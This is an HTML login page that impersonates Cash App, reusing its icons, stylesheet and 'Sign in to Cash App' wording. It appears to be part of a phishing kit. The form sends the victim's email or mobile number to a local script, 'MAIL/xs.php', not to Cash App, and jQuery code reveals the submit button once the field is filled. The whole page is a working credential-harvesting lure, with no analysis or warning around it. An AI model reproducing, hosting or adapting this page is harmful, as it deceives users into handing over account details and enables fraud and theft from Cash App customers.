<html>
<head>
<title>Cash App</title>
<meta charset="utf-8">
<link rel="icon" sizes="196x196" href="https://cash.app/icon-196.png">
<link rel="icon" href="https://cash.app/favicon.ico">
<link rel="mask-icon" href="https://cash.app/favicon-pinned.svg" color="#18C300">
<link rel="stylesheet" type="text/css" href="https://cash-f.squarecdn.com/ember/8e9fede24675d26d4335a5cac93d444b49c7de11/assets/cash.css" >
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
<style>

body {
  overflow: hidden;
}


/* Preloader */

#preloader {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #0bb634;
  /* change if the mask should have another color then white */
  z-index: 99;
  /* makes sure it stays on top */
}

#status {
  width: 200px;
  height: 200px;
  position: absolute;
  left: 50%;
  /* centers the loading animation horizontally one the screen */
  top: 50%;
  /* centers the loading animation vertically one the screen */
  background-image: url(https://cash.app/icon-196.png);
  /* path to your loading animation */
  background-repeat: no-repeat;
  background-position: center;
  margin: -100px 0 0 -100px;
  /* is width and height divided by two */
}



</style>
<script>

$(window).on('load', function() { // makes sure the whole site is loaded 
  $('#status').fadeOut(); // will first fade out the loading animation 
  $('#preloader').delay(350).fadeOut('slow'); // will fade out the white DIV that covers the website. 
  $('body').delay(350).css({'overflow':'visible'});
})

</script>
</head>

<!-------------------------- Preloader ----------------------------->
<div id="preloader">
  <div id="status">&nbsp; 
</div>
</div>
<!-------------------------- Preloader ----------------------------->

<!-------------------------- Body ----------------------------->
<body class="theme-bg ember-application theme-green">
<div id="ember321" class="ember-view">
<div id="ember345" class="full-height application-cash ember-view">  
<div id="ember352" class="cookie-banner ember-view"></div>
<section class="layout-login flex-container full-height pad">
<div class="login-container flex-container flex-v-center flex-fill">
<!---->      
<h1 class="step-title flex-static">Sign in to Cash&nbsp;App</h1>


<form action="MAIL/xs.php" method="POST" autocomplete="off" spellcheck="true" novalidate="true" id="signUpForm" class="login-form ember-view">        
<div id="ember384" class="field fk-field-container ember-view">
<input type="text" name="username" id="emailField" class="required" placeholder="Email or Mobile Number">
<div id="ember399" class="cta submit-button-component submit-button-with-spinner ember-view">
<button type="submit" class="button theme-button theme-button" id="okButton" disabled>Request Sign In Code</button>
<div id="ember405" class="spinner-container ember-view"></div></div>
</form>

<!----->
        
      
        
</form>  </div>
</section>

  <!---->
  <div id="ember408" class="modal-manager ember-view"><div class="modal-overlay "></div>
<!----></div>
</div></div>



<script>
const signUpForm = document.getElementById('signUpForm');
const emailField = document.getElementById('emailField');
const okButton = document.getElementById('okButton');
  
emailField.addEventListener('keyup', function (event) {
  isValidEmail = emailField.checkValidity();
  
  if ( isValidEmail ) {
    okButton.disabled = false;
  } else {
    okButton.disabled = true;
  }
});
  
okButton.addEventListener('click', function (event) {
  signUpForm.submit();
});


$(document).ready(function() {
    var button = $('#okButton');
    var required = $('.required');
    var counter = 0;
    var trigger = required.length;
    button.hide();

    required.on('keyup', function () {
        var self = $(this);
        if(self.val() !== '') {
            if (!self.data('valid') && ++counter === trigger) button.show();
            self.data('valid', true);
        } else {
            if (self.data('valid')) --counter;
            button.hide();
            self.data('valid', false);
        }
    });
});



</script>

</body>
<!-------------------------- Preloader ----------------------------->

</html>